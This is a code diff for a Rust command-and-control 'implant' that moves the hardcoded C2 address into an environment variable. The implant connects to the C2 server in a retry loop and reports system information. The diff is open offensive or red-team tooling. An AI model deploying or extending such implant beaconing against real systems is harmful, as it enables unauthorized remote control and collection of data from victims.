@@ -1,6 +1,4 @@
-use std::{io::Write, net::TcpStream, process::Command, thread::sleep, time::Duration};
-
-const C2_ADDRESS: &str = "127.0.0.1:9120";
+use std::{env, io::Write, net::TcpStream, process::Command, thread::sleep, time::Duration};
 
 use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode, read_packet};
 use rand::{Rng, rng};
@@ -61,7 +59,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 fn connect() -> TcpStream {
     loop {
-        let stream = TcpStream::connect(C2_ADDRESS);
+        let stream = TcpStream::connect(
+            env::var("TYSE_ADDRESS")
+                .expect("set the TYSE_ADDRESS env var to specify the C2 address"),
+        );
         if stream.is_err() {
             println!("Failed to estabilish a connection to the C2, retrying in a minute...");
             sleep(Duration::from_secs(if cfg!(debug_assertions) {
